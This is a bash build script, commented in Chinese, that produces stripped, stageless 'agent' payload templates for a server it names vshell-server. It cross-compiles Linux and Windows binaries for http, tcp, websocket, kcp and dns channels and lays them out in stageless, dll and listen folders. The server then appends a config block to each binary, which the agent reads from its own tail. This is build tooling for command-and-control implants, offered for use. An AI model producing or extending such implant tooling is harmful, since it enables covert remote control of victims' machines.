#!/usr/bin/env bash
# 生成载荷模板：把不带任何 ldflags 的 agent 二进制按 4.9.3 的命名放进
# stageless/<tp>_<arch>（以及 dll/ 目录），服务端下载时会在这份模板后面
# 追加配置块，agent 启动时从自身尾部读取配置。
#
# 用法：./scripts/make-templates.sh [输出目录，默认 ./template-build]
set -euo pipefail
ROOT=$(cd "$(dirname "$0")/.." && pwd)
OUT=${1:-$ROOT/template-build}

TARGETS=${TARGETS:-"linux/amd64 linux/arm64 windows/amd64"}
TPS=${TPS:-"http tcp ws kcp dns"}

mkdir -p "$OUT/stageless" "$OUT/dll" "$OUT/listen" "$OUT/shellcode"

for t in $TARGETS; do
  GOOS=${t%%/*}; GOARCH=${t##*/}
  for tp in $TPS; do
    if [[ "$tp" == "dns" && "$GOOS" != "linux" ]]; then continue; fi
    if [[ "$GOOS" == "windows" && ( "$tp" == "kcp" ) ]]; then continue; fi
    name="stageless/${tp}_${GOOS}_${GOARCH}"
    ( cd "$ROOT/agent" && GOOS=$GOOS GOARCH=$GOARCH CGO_ENABLED=0 go build -trimpath -ldflags "-s -w" -o "$OUT/$name" . ) || {
      echo "[skip] $name 构建失败" >&2; continue; }
    echo "[ok] $name ($(stat -c%s "$OUT/$name") bytes)"
  done
done

# dll/listen/shellcode 先复用同一份 agent（4.9.3 里是不同模板，失败时回落）
for f in "$OUT"/stageless/*; do
  base=$(basename "$f")
  cp "$f" "$OUT/dll/$base" 2>/dev/null || true
  cp "$f" "$OUT/listen/$base" 2>/dev/null || true
done

echo "模板已生成到 $OUT"
echo "部署：把 stageless/ dll/ listen/ 复制到服务端工作目录（与 vshell-server 同级）"
